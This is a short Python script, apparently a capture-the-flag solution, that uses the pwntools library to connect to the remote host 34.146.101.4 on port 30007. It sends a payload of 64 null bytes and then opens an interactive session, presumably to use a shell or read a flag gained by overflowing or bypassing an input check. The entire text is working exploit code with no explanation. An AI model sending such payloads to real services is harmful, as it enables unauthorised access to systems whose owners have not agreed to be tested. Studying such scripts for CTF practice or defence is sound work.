from pwn import *

r = remote("34.146.101.4", 30007)

payload = "\x00"*64
r.sendline(payload)
r.interactive()